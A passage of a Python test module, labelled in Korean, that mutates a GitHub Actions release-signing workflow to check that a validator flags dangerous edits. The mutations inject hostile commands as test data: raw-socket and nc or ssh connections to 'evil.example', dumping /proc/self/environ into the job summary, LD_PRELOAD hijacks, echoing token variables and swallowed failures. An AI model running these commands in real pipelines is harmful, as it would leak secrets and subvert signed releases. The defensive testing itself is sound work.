        add("구조 단계 순서 바꿈(후보 검증과 매니페스트)", mutate_sign(VERIFY_STEP + "\n" + MANIFEST_STEP, MANIFEST_STEP + "\n" + VERIFY_STEP), "구조", "X-2")
        add("구조 sign 의 사전 점검 삭제", mutate_sign(SIGN_PREFLIGHT + "\n", ""), "구조")
        add("구조 build 의 사전 점검 삭제", mutate_build(PREFLIGHT_BUILD + "\n", ""), "구조")
        add("구조 서명 단계 삭제", mutate_sign(SIGN_STEP + "\n", ""), "구조", "W-4", "X-1", "X-2")
        add("구조 해시 목록 단계 삭제", mutate_sign(HASH_STEP + "\n", ""), "구조")
        add("구조 사후 점검 삭제", mutate_sign(POST_STEP + "\n", ""), "구조")
        add("구조 단계에 if", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.replace("        run:", "        if: always()\n        run:")), "구조")
        add("구조 단계에 continue-on-error", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "        continue-on-error: true\n"), "구조")
        add("구조 단계에 shell", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "        shell: cmd\n"), "구조")
        add("구조 단계에 working-directory", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "        working-directory: packaging\n"), "구조")
        add("구조 기본 셸을 바꿈", mutate(DEFAULTS, "defaults:\n  run:\n    shell: pwsh\n"), "구조")
        add("구조 기본 셸 블록 없음", mutate(DEFAULTS + "\n", ""), "구조")
        add("구조 build 러너를 ubuntu 로", mutate("    runs-on: windows-latest\n", "    runs-on: ubuntu-latest\n"), "구조")
        add("구조 sign 러너를 windows 로", mutate("    runs-on: ubuntu-latest\n", "    runs-on: windows-latest\n"), "구조")
        add("구조 self-hosted 러너", mutate("    runs-on: ubuntu-latest\n", "    runs-on: self-hosted\n"), "구조")
        add("구조 needs 삭제", mutate("    needs: build\n", ""), "구조")
        add("구조 잡 env 에 색인", mutate_build("    env:\n      PYTHONUTF8: '1'\n", "    env:\n      PYTHONUTF8: '1'\n      PIP_INDEX_URL: x\n"), "구조")
        add("구조 단계 env 에 키를 더함", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run:", "        env:\n          PYTHONPATH: x\n        run:")), "구조")
        add("구조 최상위 env 추가", mutate("jobs:\n", "env:\n  X: '1'\n\njobs:\n"), "구조")
        add("구조 산출물 이름이 둘 다 바뀜", mutate("          name: release-candidate\n", "          name: everything\n", 2), "구조")
        add("구조 올리는 산출물 이름만 바뀜(받는 쪽과 어긋남)", mutate_build("          name: release-candidate\n", "          name: everything\n"), "구조")
        add("구조 워크플로 이름 바꿈", mutate('name: "Release — 릴리스 초안 만들기(수동)"', 'name: "Release"'), "구조")
        add("구조 build 의 단계를 더함", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "\n      - name: 하나 더\n        run: python scripts/other.py\n"), "구조")
        add("구조 서명 인자에 다른 파일", mutate_sign('update-manifest.json" --require', 'update-manifest.json" --other-file x --require'), "구조")
        add("구조 전달 산출물을 다른 폴더로 받음", mutate_sign("          path: ${{ runner.temp }}/release\n", "          path: ${{ runner.temp }}/elsewhere\n"), "구조")
        add("구조 중복 키", mutate("permissions: {}\n", "permissions: {}\npermissions: {}\n"), "구조")
        add("구조 보이지 않는 글자(줄 나눔)", mutate("# 이 파일은 초안까지만 만든다", "# 이 파일은" + chr(0x2028) + "  push: 숨김"), "구조")
        add("구조 흐름식 단계(run)", mutate_build(PACKAGE_STEP, '      - {run: "echo hi"}\n\n' + PACKAGE_STEP), "구조")
        add("구조 문서 표시 ---", "---\n" + REAL, "구조")

        # ---- 독립 검증 S 의 S-1(필수, 결정 D-887): 값·줄 끝의 유니코드 공백(NBSP·U+3000)은 값의 일부다 — 못박은 값이 보이지 않는 글자 하나로 통과하던 길 -----------------------
        NB, IS, BS, NL, INDENT = chr(0xA0), chr(0x3000), chr(0x5C), chr(0x0A), " " * 10
        add("S-1 environment 값 끝의 NBSP", mutate("    environment: release\n", "    environment: release" + NB + "\n"), "W-14", "W-4")
        add("S-1 runs-on 값 끝의 U+3000", mutate("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest" + IS + "\n"), "구조")
        add("S-1 needs 값 끝의 NBSP", mutate("    needs: build\n", "    needs: build" + NB + "\n"), "구조")
        add("S-1 build 권한 값 끝의 U+3000", mutate_build("      contents: read\n", "      contents: read" + IS + "\n"), "W-3")
        add("S-1 sign 권한 값 끝의 NBSP", mutate_sign("      contents: write\n", "      contents: write" + NB + "\n"), "W-3")
        add("S-1 if-no-files-found 값 끝의 NBSP", mutate("if-no-files-found: error", "if-no-files-found: error" + NB), "W-11", "구조")
        add("S-1 retention-days 값 끝의 U+3000", mutate("          retention-days: 1\n", "          retention-days: 1" + IS + "\n"), "W-11", "구조")
        add("S-1 cancel-in-progress 값 끝의 NBSP", mutate("  cancel-in-progress: false\n", "  cancel-in-progress: false" + NB + "\n"), "W-13")
        add("S-1 서명 비밀 식 뒤의 NBSP", mutate_sign("UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}\n", "UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}" + NB + "\n"), "W-4", "구조")
        add("S-1 최상위 빈 매핑 뒤의 NBSP", mutate(TOP, "permissions: {}" + NB + "\n"), "구조")
        add("S-1 run 한 줄 값 끝의 NBSP(사전 점검 다시)", mutate_sign("        run: python scripts/release_preflight.py\n", "        run: python scripts/release_preflight.py" + NB + "\n"), "W-8", "구조")
        add("S-1 서명 명령 끝의 NBSP", mutate_sign("--require-openssl\n", "--require-openssl" + NB + "\n"), "X-1", "구조")
        add("S-1 블록 글 줄 끝의 NBSP", mutate_sign('          cd "$RUNNER_TEMP/release"\n          echo "###', '          cd "$RUNNER_TEMP/release"' + NB + '\n          echo "###'), "구조")
        add("S-1 올리는 경로 줄 끝의 NBSP", mutate("            ${{ runner.temp }}/release/SHA256SUMS\n", "            ${{ runner.temp }}/release/SHA256SUMS" + NB + "\n"), "W-11", "구조")
        add("S-1 잡 표시 이름 끝의 NBSP",mutate("    name: 빌드 — 설치 파일·휴대용 압축 파일·후보 목록 (Windows, 비밀 없음)\n", "    name: 빌드 — 설치 파일·휴대용 압축 파일·후보 목록 (Windows, 비밀 없음)" + NB + "\n"), "구조")
        add("S-1 줄 끝 역슬래시 뒤 공백이 다음 줄 명령을 가림", inject_sign("echo hi " + BS + " " + NL + INDENT + "curl x"), "구조")
        add("S-1 줄 끝 역슬래시 뒤 공백(두 칸)", inject_sign("echo hi " + BS + "  " + NL + INDENT + "rm -rf x"), "구조")
        add("S-1 줄 끝 역슬래시 뒤 공백(주석 줄)", mutate("시험이 구조로 지킨다.\n", "시험이 구조로 지킨다. " + BS + " \n"), "구조")
        add("W-12 전각 숫자 한도(１５)", mutate(SIGN_TIMEOUT, "    timeout-minutes: " + chr(0xFF11) + chr(0xFF15) + "\n"), "W-12")
        add("W-12 전각 숫자 한도(build ４５)", mutate(BUILD_TIMEOUT, "    timeout-minutes: " + chr(0xFF14) + chr(0xFF15) + "\n"), "W-12")

        # ---- 독립 검증 S 의 R-3·I-12: 식의 대소문자와 허용된 자리 — GitHub 식의 컨텍스트·함수 이름은 대소문자를 가리지 않는다 -----------------------------------------
        def env_extra(expression, job="build"):
            mutator = mutate_build if job == "build" else mutate_sign
            return mutator("    env:\n      PYTHONUTF8: '1'\n", "    env:\n      PYTHONUTF8: '1'\n      K: " + expression + "\n")

        for label, expression in (("SECRETS 대문자 컨텍스트", "${{ SECRETS.UPDATE_SIGNING_KEY }}"), ("Secrets 섞인 대소문자 다른 비밀", "${{ Secrets.OTHER_SECRET }}"), ("github.TOKEN 대문자 속성", "${{ github.TOKEN }}"), ("GITHUB.token 대문자 컨텍스트", "${{ GITHUB.token }}"),
                                  ("GITHUB.TOKEN 전부 대문자", "${{ GITHUB.TOKEN }}"), ("toJson(github)", "${{ toJson(github) }}"), ("tojson(github) 전부 소문자", "${{ tojson(github) }}"), ("fromjson 소문자", "${{ fromjson('{}') }}"),
                                  ("GITHUB['token'] 대문자 대괄호", "${{ GITHUB['token'] }}"), ("toJson(SECRETS)", "${{ toJson(SECRETS) }}"), ("format 안의 SECRETS", "${{ format('{0}', SECRETS.X) }}"), ("join(SECRETS)", "${{ join(SECRETS, ',') }}")):
            add(f"R-3 잡 env 에 {label}", env_extra(expression), "W-4")
        add("R-3 sign 잡 env 에 SECRETS 대문자", env_extra("${{ SECRETS.UPDATE_SIGNING_KEY }}", "sign"), "W-4")
        add("R-3 run 안에서 토큰 변수를 소문자로 부름($gh_token)", inject_sign('echo "$gh_token"'), "W-7")
        add("R-3 run 안에서 서명 변수를 소문자로 부름($update_signing_key)", inject_sign('echo "$update_signing_key"'), "W-7")
        for label, expression in (("vars 맥락", "${{ vars.ANYTHING }}"), ("이벤트 글(github.event)", "${{ github.event.head_commit.message }}"), ("env 맥락(env.GH_TOKEN)", "${{ env.GH_TOKEN }}"), ("github 맥락 통째", "${{ github }}"),
                                  ("runner 맥락의 다른 속성", "${{ runner.os }}"), ("inputs 맥락", "${{ inputs.x }}"), ("format 으로 합친 식", "${{ format('{0}', github.sha) }}"), ("job 맥락", "${{ job.status }}")):
            add(f"W-4 허용 자리 밖의 식 — {label}", env_extra(expression), "W-4")
        add("W-4 허용 식이 엉뚱한 칸에(github.sha 를 TARGET 이 아닌 칸에)", env_extra("${{ github.sha }}"), "W-4")
        add("W-4 허용 식이 엉뚱한 칸에(github.token 을 다른 이름 칸에)", env_extra("${{ github.token }}"), "W-4")
        add("W-4 단계 with 에 env.GH_TOKEN 식(download-artifact)", mutate_sign(step_text("후보 받기"), step_text("후보 받기").replace("          name: release-candidate\n", "          name: release-candidate\n          github-token: ${{ env.GH_TOKEN }}\n")), "W-4")
        add("W-4 잡 표시 이름에 식", mutate("    name: 빌드 — 설치 파일·휴대용 압축 파일·후보 목록 (Windows, 비밀 없음)\n", "    name: ${{ github.event.head_commit.message }}\n"), "W-4", "구조")
        add("W-4 단계 이름에 식", mutate("      - name: 사전 점검\n", "      - name: ${{ github.event.head_commit.message }}\n"), "W-4", "구조")
        add("W-4 path 안에 runner.temp 가 아닌 식", mutate_sign("          path: ${{ runner.temp }}/release\n", "          path: ${{ github.workspace }}/release\n"), "W-4", "구조")

        # ---- 독립 검증 S 의 R-1·R-2·R-4·R-5(결정 D-888) — 구조 허용 목록을 빼고 규칙만으로도 걸려야 하는 위험한 글. 기대 이름표는 구조가 아닌 W·X 규칙이다 -----------------------------------
        VERIFY_CMD = 'python scripts/update_manifest.py verify-candidate --dir "$RUNNER_TEMP/release"'
        MAN_CMD = 'python scripts/update_manifest.py build --dir "$RUNNER_TEMP/release" --min-version 0.0.0'
        SIGN_CMD = 'python scripts/update_sign.py --manifest "$RUNNER_TEMP/release/update-manifest.json" --require-shipped-key --require-openssl'
        READ_LINE = '          read -r version < VERSION || [[ -n "$version" ]]\n'

        def run_replace(command, *lines):
            """한 줄짜리 run(`command`)을 블록 글(lines)로 바꾼다."""
            return edit(("        run: " + command + "\n", "        run: |\n" + "".join("          " + line + "\n" for line in lines), 1))

        add("R-1 실패 삼키기 — 후보 검증 뒤 || echo", run_replace(VERIFY_CMD, VERIFY_CMD + " || echo skipped"), "W-8")
        add("R-1 실패 삼키기 — 후보 검증 뒤 || exit 0", run_replace(VERIFY_CMD, VERIFY_CMD + " || exit 0"), "W-8")
        add("R-1 실패 삼키기 — 후보 검증 뒤 ; true", run_replace(VERIFY_CMD, VERIFY_CMD + " ; true"), "W-8")
        add("R-1 실패 삼키기 — 서명 명령 앞의 !", run_replace(SIGN_CMD, "! " + SIGN_CMD), "W-8", "X-1")
        add("R-1 실패 삼키기 — if 조건으로 후보 검증", run_replace(VERIFY_CMD, "if " + VERIFY_CMD + "; then", "  echo ok", "else", "  echo skipped", "fi"), "W-8")
        add("R-1 실패 삼키기 — 후보 검증 뒤 && echo", run_replace(VERIFY_CMD, VERIFY_CMD + " && echo ok", "echo continue"), "W-8")
        add("R-1 실패 삼키기 — 매니페스트 단계 첫 줄 exit 0", run_replace(MAN_CMD, "exit 0", MAN_CMD), "W-8")
        add("R-1 실패 삼키기 — VERSION 읽기가 || 대입으로 대체", edit((READ_LINE, '          read -r version < VERSION || version=0.0.0\n', 2)), "W-8")
        add("R-1 실패 삼키기 — 버전 모양 확인의 exit 1 을 true 로", edit(('=~ $re ]] || exit 1\n', '=~ $re ]] || true\n', 2)), "W-8")
        add("R-1 실패 삼키기 — 서명 명령을 파이프로 넘김", run_replace(SIGN_CMD, SIGN_CMD + " | sha256sum"), "W-8")
        add("R-1 앞 대입 — python 앞의 PYTHONPATH", run_replace(MAN_CMD, "PYTHONPATH=/tmp " + MAN_CMD), "W-8")
        add("R-1 앞 대입 — sha256sum 앞의 LD_PRELOAD", inject_sign("LD_PRELOAD=/tmp/x.so sha256sum SHA256SUMS"), "W-8")
        add("R-1 앞 대입 — PATH 만 바꾸는 줄", inject_sign("PATH=/tmp:$PATH"), "W-8")
        add("R-1 앞 대입 — BASH_ENV", inject_sign("BASH_ENV=/dev/null"), "W-8")
        add("R-1 앞 대입 — IFS", inject_sign("IFS=/"), "W-8")
        add("R-1 앞 대입 — GH_TOKEN 을 글자로", inject_sign("GH_TOKEN=x"), "W-8")
        add("R-1 앞 대입 — GITHUB_STEP_SUMMARY 를 다른 파일로", inject_sign('GITHUB_STEP_SUMMARY="$RUNNER_TEMP/release/update-manifest.json"' + NL + INDENT + 'echo tampered >> "$GITHUB_STEP_SUMMARY"'), "W-8")
        add("R-1 옵션을 변수에 담아 --draft=false", edit((READ_LINE, "          FLAGS=--draft=false\n" + READ_LINE, 2), (' --draft --target "$TARGET_SHA"', ' --draft $FLAGS --target "$TARGET_SHA"', 1)), "W-8")
        add("R-1 명령을 변수에 담기", inject_sign("cmd=curl" + NL + INDENT + "$cmd x"), "W-8")
        add("R-1 따옴표 없는 변수 확장이 인자를 더함", edit((MAN_CMD, MAN_CMD + " $EXTRA", 1)), "W-8")
        add("R-1 python 이 정해진 것 밖의 저장소 스크립트", inject_sign("python scripts/update_keygen.py"), "W-8")
        add("R-1 python3", run_replace(MAN_CMD, MAN_CMD.replace("python ", "python3 ", 1)), "W-8")
        add("R-1 서명 명령에 인자를 더함", edit((SIGN_CMD, SIGN_CMD + ' --overwrite --sig-out "$RUNNER_TEMP/elsewhere.sig"', 1)), "W-8", "구조")
        add("R-1 서명 명령의 --manifest 가 값 없이 다른 옵션을 먹음", edit((SIGN_CMD, "python scripts/update_sign.py --manifest --require-shipped-key --require-openssl", 1)), "W-8", "구조")
        add("R-1 매니페스트 만들기에 인자를 더함", edit((MAN_CMD, MAN_CMD + ' --key-id 0123456789abcdef --out "$RUNNER_TEMP/m.json"', 1)), "W-8", "구조")
        add("R-1 sha256sum 이 환경 파일을 요약에", inject_sign('sha256sum /proc/self/environ >> "$GITHUB_STEP_SUMMARY"'), "W-8")
        add("R-1 echo 가 요약이 아닌 곳으로(>&2)", inject_sign("echo hi >&2"), "W-8")
        add("R-1 echo 가 방향 바꾸기 없이(로그로)", inject_sign("echo hi"), "W-8")
        add("R-1 cd 가 다른 곳으로", inject_sign('cd "$RUNNER_TEMP"'), "W-8")
        add("R-1 서명 단계 명령 앞에 변수 대입", run_replace(SIGN_CMD, "X=1 " + SIGN_CMD), "W-8", "X-1")
        add("R-1 옛 태그 확인(오류를 삼키는 if)이 되살아남", edit(('          gh api "repos/${GITHUB_REPOSITORY}/git/matching-refs/tags/v${version}" --paginate --jq', '          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/v${version}" > /dev/null 2>&1; then' + NL + INDENT + '  exit 1' + NL + INDENT + 'fi' + NL + '          gh api "repos/${GITHUB_REPOSITORY}/git/matching-refs/tags/v${version}" --paginate --jq', 1)), "W-8")

        add("R-2 gh api 붙은 꼴 -fdraft=false", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases/1" -fdraft=false'), "W-9")
        add("R-2 gh api 붙은 꼴 -Fdraft=false", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases/1" -Fdraft=false'), "W-9")
        add("R-2 gh api 붙은 꼴로 공개 릴리스 만들기", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" -ftag_name=v1.0.0 -fdraft=false'), "W-9")
        add("R-2 gh api 붙은 꼴로 태그 만들기", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/git/refs" -fref=refs/tags/v1.0.0 -fsha="$TARGET_SHA"'), "W-9")
        add("R-2 gh api 옵션이 경로 앞에(-X PATCH)", inject_sign('gh api -X PATCH "repos/${GITHUB_REPOSITORY}/releases/1"'), "W-9")
        add("R-2 gh api --hostname", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" --hostname evil.example'), "W-9")
        add("R-2 gh api -H 머리글", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" -H "Authorization: token x"'), "W-9")
        add("R-2 gh api --input", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" --input x.json'), "W-9")
        add("R-2 gh api 점점 경로", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/../../user"'), "W-8")
        add("R-2 gh api 가 다른 저장소 경로", inject_sign('gh api "repos/other/x/releases"'), "W-8")
        add("R-2 gh api 앞에 GH_HOST 대입", inject_sign('GH_HOST=evil.example gh api "repos/${GITHUB_REPOSITORY}/releases"'), "W-8")
        add("R-2 gh api 에 경로 말고 낱말이 더", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" extra'), "W-8")
        add("R-8 태그 확인 gh api 의 --jq 가 둘(gh 는 뒤의 식이 이겨 앞의 error 가 지워진다)", mutate_sign(" --paginate --jq '.[] | select", " --paginate --jq . --jq '.[] | select", 1), "W-9")
        add("R-8 릴리스 목록 gh api 의 --jq 가 둘(뒤의 식이 이긴다)", mutate_sign("releases?per_page=100\" --jq 'map(", "releases?per_page=100\" --jq . --jq 'map(", 1), "W-9")
        add("R-8 태그 확인 gh api 의 --paginate 가 둘", mutate_sign(" --paginate --jq '.[] | select", " --paginate --paginate --jq '.[] | select", 1), "W-9")
        add("R-2 --title 값으로만 있는 --draft", edit((" --draft --prerelease", " --prerelease", 1), (" --draft --target", " --target", 1), ('--title "ChanceBlog Desktop ${version}"', '--title "--draft"', 2)), "W-9")
        add("R-2 --title 이 --target 을 값으로 먹음", edit(('--target "$TARGET_SHA" --title "ChanceBlog Desktop ${version}"', '--title --target "$TARGET_SHA"', 2)), "W-10")
        add("R-2 --repo 가 다른 저장소", edit(('--repo "$GITHUB_REPOSITORY"', "--repo other/repo", 2)), "W-8")
        add("R-2 자산 경로를 더함", edit(("update-manifest.json.sig\n", "update-manifest.json.sig /etc/hosts\n", 2)), "W-8")
        add("R-2 자산 이름을 하나 뺌", edit((" PACKAGE_INFO.md SHA256SUMS update-manifest.json update-manifest.json.sig\n", " PACKAGE_INFO.md SHA256SUMS update-manifest.json\n", 2)), "W-8")
        add("R-2 --latest=true", edit((" --draft --target", " --draft --latest=true --target", 1), (" --draft --prerelease --target", " --draft --prerelease --latest=true --target", 1)), "W-9")
        add("R-2 --discussion-category", edit((" --draft --target", " --draft --discussion-category General --target", 1), (" --draft --prerelease --target", " --draft --prerelease --discussion-category General --target", 1)), "W-9")
        add("R-2 --target 을 = 로 붙임", edit(('--target "$TARGET_SHA"', '--target="$TARGET_SHA"', 2)), "W-9", "W-10")
        add("R-2 --notes-file 이 다른 파일", edit(('--notes-file "$RUNNER_TEMP/release-notes.md"', "--notes-file /etc/hosts", 2)), "W-9")
        add("R-2 --prerelease 가 둘", edit((" --draft --prerelease", " --draft --prerelease --prerelease", 1)), "W-9")

        GET_STEP = step_text("후보 받기")
        SETUP_STEP = step_text("파이썬 3.12")
        add("R-5 download-artifact 의 run-id 와 repository", mutate_sign(GET_STEP, GET_STEP.replace("          name: release-candidate\n", "          name: release-candidate\n          run-id: 1\n          repository: other/repo\n")), "W-6")
        add("R-5 download-artifact 의 path 가 runner.temp 밖으로", mutate_sign("          path: ${{ runner.temp }}/release\n", "          path: ${{ runner.temp }}/../..\n"), "W-6")
        add("R-5 download-artifact 의 pattern 과 merge-multiple", mutate_sign(GET_STEP, GET_STEP.replace("          name: release-candidate\n", "          pattern: '*'\n          merge-multiple: true\n")), "W-6")
        add("R-5 download-artifact 의 이름이 올리는 쪽과 다름", mutate_sign("          name: release-candidate\n          path: ${{ runner.temp }}/release\n", "          name: other-name\n          path: ${{ runner.temp }}/release\n"), "W-6")
        add("R-5 download-artifact 에 github-token", mutate_sign(GET_STEP, GET_STEP.replace("          name: release-candidate\n", "          name: release-candidate\n          github-token: x\n")), "W-6")
        add("R-5 setup-python 의 cache(sign 잡)", mutate_sign(SETUP_STEP, SETUP_STEP.replace("          python-version: '3.12'\n", "          python-version: '3.12'\n          cache: pip\n")), "W-6")
        add("R-5 setup-python 의 check-latest(build 잡)", mutate_build(SETUP_STEP, SETUP_STEP.replace("          python-version: '3.12'\n", "          python-version: '3.12'\n          check-latest: true\n")), "W-6")
        add("R-5 setup-python 의 python-version 이 3.숫자가 아님", edit(("          python-version: '3.12'\n", "          python-version: '3.x'\n", 2)), "W-6")
        add("R-5 올리기 산출물 이름이 양쪽 다 바뀜", mutate("          name: release-candidate\n", "          name: other-name\n", 2), "W-11", "W-6")
        add("R-5 올리기 산출물 이름만 바뀜", mutate_build("          name: release-candidate\n", "          name: other-name\n"), "W-11")

        for label, line in (("python -c 로 urllib", 'python -c "import urllib.request as u; u.urlopen(0)"'), ("nc", "nc evil.example 80"), ("aria2c", "aria2c x"), ("git ls-remote", "git ls-remote origin"), ("ssh", "ssh evil.example"), ("scp", "scp a b"),
                            ("perl -e", "perl -e 1"), ("정해진 것 밖의 저장소 스크립트", "python scripts/update_keygen.py"), ("변수에 가린 pip", 'p=pi; $p""p install x'), ("변수에 가린 gh", "g=g; h=h; $g$h api repos/x/y"),
                            ("대문자 CURL", "CURL -O x"), ("대문자 PIP", "PIP install x"), ("대문자 Python -m pip", "Python -m pip install x"), ("python.exe -m pip", "python.exe -m pip install x"), ("msiexec", "msiexec /i x.msi"),
                            ("git lfs pull", "git lfs pull"), ("uv sync", "uv sync"), ("uvx", "uvx x"), ("pipx", "pipx install x"), ("easy_install", "easy_install x"), ("conda", "conda install x"), ("gem", "gem install x"),
                            ("go install", "go install x@latest"), ("소문자 invoke-webrequest", "invoke-webrequest x"), ("python3.12 -m pip", "python3.12 -m pip install x"), ("py -3.12 -m pip", "py -3.12 -m pip install x"),
                            ("bash 의 /dev/tcp", "exec 3<>/dev/tcp/evil.example/80"), ("일반 명령 ls", "ls"), ("실패 삼키기 || true", "python scripts/release_preflight.py || true"), ("앞 대입 PIP_INDEX_URL", "PIP_INDEX_URL=x python scripts/release_preflight.py")):
            add(f"R-4 build 에 {label}", inject_build(line), "W-15")
        add("R-4 build 요약 단계의 묶음 안에 허용 밖 명령", mutate_build('            cat "$RUNNER_TEMP/release/release_candidate.json"\n', '            cat "$RUNNER_TEMP/release/release_candidate.json"\n            ls\n'), "W-15")
        add("R-4 build 요약 묶음이 다른 파일에 덧붙임", mutate_build('          } >> "$GITHUB_STEP_SUMMARY"', '          } >> "$RUNNER_TEMP/release/release_candidate.json"'), "W-15")

        # 변이 시험이 보인 '다른 규칙과 겹쳐서만 걸리던' 틈을 막는 글 — 허용된 명령들만으로 이루어져 있어 이 규칙 하나만으로 걸려야 한다
        add("R-1 허용 명령 둘을 &&로 이음", run_replace(VERIFY_CMD, VERIFY_CMD + " && " + MAN_CMD), "W-8")
        add("R-1 허용 명령 둘을 |로 이음", run_replace(VERIFY_CMD, VERIFY_CMD + " | " + MAN_CMD), "W-8")
        add("R-1 허용 명령 둘을 ||로 이음", run_replace(VERIFY_CMD, VERIFY_CMD + " || " + MAN_CMD), "W-8")
        add("R-1 허용 명령 둘을 ;로 이음", run_replace(VERIFY_CMD, VERIFY_CMD + " ; " + MAN_CMD), "W-8")
        add("R-1 따옴표 없는 허용 변수(cd $RUNNER_TEMP/release)", inject_sign("cd $RUNNER_TEMP/release"), "W-8")
        add("R-1 따옴표 없는 허용 변수(>> $GITHUB_STEP_SUMMARY)", inject_sign("echo hi >> $GITHUB_STEP_SUMMARY"), "W-8")
        add("R-1 [[ 의 허용 밖 모양", inject_sign('[[ "$version" == "1.0.0" ]]'), "W-8")
        add("W-11 sign 잡에 후보 경로로 업로드를 하나 더", mutate_sign(step_text("작업 요약(공개 전 확인 목록)"), step_text("작업 요약(공개 전 확인 목록)") + "\n      - name: 또 올림\n        uses: " + UPLOAD + "\n        with:\n          name: release-candidate\n          path: ${{ runner.temp }}/release/SHA256SUMS\n          retention-days: 1\n          if-no-files-found: error\n"), "W-11", "구조")
        add("W-11 build 에 업로드가 둘", mutate_build(UPLOAD_STEP, UPLOAD_STEP + "\n" + UPLOAD_STEP.replace("올리기(후보 파일 여섯, 1일)", "올리기 한 번 더")), "W-11", "구조")
        add("S-1 이름 붙은 설치 단계 명령 끝의 NBSP", mutate_build("        run: " + support.DOWNLOAD_COMMAND + "\n", "        run: " + support.DOWNLOAD_COMMAND + NB + "\n"), "W-15", "구조")
        for label, line in (("nc", "nc evil.example 80"), ("aria2c", "aria2c x"), ("ssh", "ssh evil.example"), ("scp", "scp a b"), ("perl -e", "perl -e 1"), ("uvx", "uvx x"), ("pipx", "pipx install x"), ("git ls-remote", "git ls-remote origin")):
            add(f"R-4 sign 잡에 {label}", inject_sign(line), "W-15", "W-8")

        # 변이 시험이 다시 보인 틈(독립 검증 Q 의 K07·K09·K14·K15·K41·K74) — 다른 검사가 같은 이름표로 대신 걸리지 않는 글
        head_part, rest_part = REAL.split("\njobs:\n  build:\n", 1)
        build_part, sign_part = rest_part.split("\n  sign-and-draft:\n", 1)
        add("W-3 잡 순서가 바뀜(sign-and-draft 가 앞)", head_part + "\njobs:\n  sign-and-draft:\n" + sign_part.rstrip("\n") + "\n\n  build:\n" + build_part + "\n", "W-3", "구조")
        add("W-4 키 자리의 secrets(잡 수준 secrets: inherit)", mutate_sign("    needs: build\n", "    needs: build\n    secrets: inherit\n"), "W-4", "X-3")
        add("W-4 잡 env 에 GH_TOKEN 글자 값", mutate_sign("    env:\n      PYTHONUTF8: '1'\n", "    env:\n      PYTHONUTF8: '1'\n      GH_TOKEN: x\n"), "W-4", "구조")
        add("W-4 build 단계 env 에 서명 비밀 이름(글자 값)", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run:", "        env:\n          UPDATE_SIGNING_KEY: x\n        run:")), "W-4", "구조")
        add("W-10 --target 이 같은 값으로 둘", edit(('--target "$TARGET_SHA"', '--target "$TARGET_SHA" --target "$TARGET_SHA"', 2)), "W-10")
        LAST_SIGN = step_text("작업 요약(공개 전 확인 목록)")
        add("구조 sign 잡 끝에 허용 명령만의 단계를 하나 더", mutate_sign(LAST_SIGN, LAST_SIGN + "\n      - name: 하나 더\n        run: echo x >> \"$GITHUB_STEP_SUMMARY\"\n"), "구조")
        LAST_BUILD = step_text("작업 요약(승인 전에 눈으로 확인)")
        add("구조 build 잡 끝에 허용 명령만의 단계를 하나 더", mutate_build(LAST_BUILD, LAST_BUILD + "\n      - name: 하나 더\n        run: echo x\n"), "구조")

        add("X-3 대소문자만 다른 최상위 Permissions", mutate("permissions: {}\n", "permissions: {}\nPermissions:\n  contents: write\n"), "X-3")
        add("X-3 sign 잡의 if: always()", mutate("    needs: build\n", "    needs: build\n    if: always()\n"), "X-3", "구조")
        add("X-3 단계의 continue-on-error", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "        continue-on-error: true\n"), "X-3", "구조")
        add("X-3 잡의 strategy", mutate_build("    timeout-minutes: 45\n", "    timeout-minutes: 45\n    strategy:\n      matrix:\n        x: a\n"), "X-3", "구조")
        # ---- 독립 검증 Q 의 권고 1·2·3: gh 쓰기·읽기 옵션을 하나씩, 허용 밖 명령과 방향 바꾸기, 토큰 낱말, 서명 단계 앞뒤의 명령(규칙 하나가 홀로 맡던 틈) ----------------------------------------------------
        for label, tail in (("-F 띄어 쓴 필드", "-F draft=false"), ("--field", "--field draft=false"), ("--raw-field", "--raw-field draft=false"), ("--input", "--input body.json"), ("--method=POST", "--method=POST"), ("--method POST", "--method POST"),
                            ("-XPOST 붙인 꼴", "-XPOST"), ("-X POST", "-X POST"), ("-f 띄어 쓴 필드", "-f draft=false"), ("-H 메서드 덮어쓰기", '-H "X-HTTP-Method-Override: PATCH"'), ("--hostname", "--hostname evil.example"),
                            ("--cache", "--cache 1h"), ("-i", "-i"), ("--verbose", "--verbose"), ("--template", "--template x")):
            add(f"Q gh api 의 {label}", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases/1" ' + tail), "W-9")
        add("Q gh release create 의 --latest=false", edit((" --draft --target", " --draft --latest=false --target", 1), (" --draft --prerelease --target", " --draft --prerelease --latest=false --target", 1)), "W-9")
        add("Q gh release create 의 --verify-tag", edit((" --draft --target", " --draft --verify-tag --target", 1), (" --draft --prerelease --target", " --draft --prerelease --verify-tag --target", 1)), "W-9")
        add("Q gh release create 의 -d(짧은 옵션)로 초안", edit((" --draft --prerelease", " -d --prerelease", 1), (" --draft --target", " -d --target", 1)), "W-9")
        add("Q gh release create 의 --discussion-category=x", edit((" --draft --target", " --draft --discussion-category=x --target", 1), (" --draft --prerelease --target", " --draft --prerelease --discussion-category=x --target", 1)), "W-9")
        for label, line in (("rm", "rm -rf x"), ("mkdir", "mkdir x"), ("cp", "cp a b"), ("mv", "mv a b"), ("ls", "ls"), ("test", "test -f x"), ("tee", "echo hi | tee x"), ("touch", "touch x"), ("chmod", "chmod +x x"), ("true", "true"),
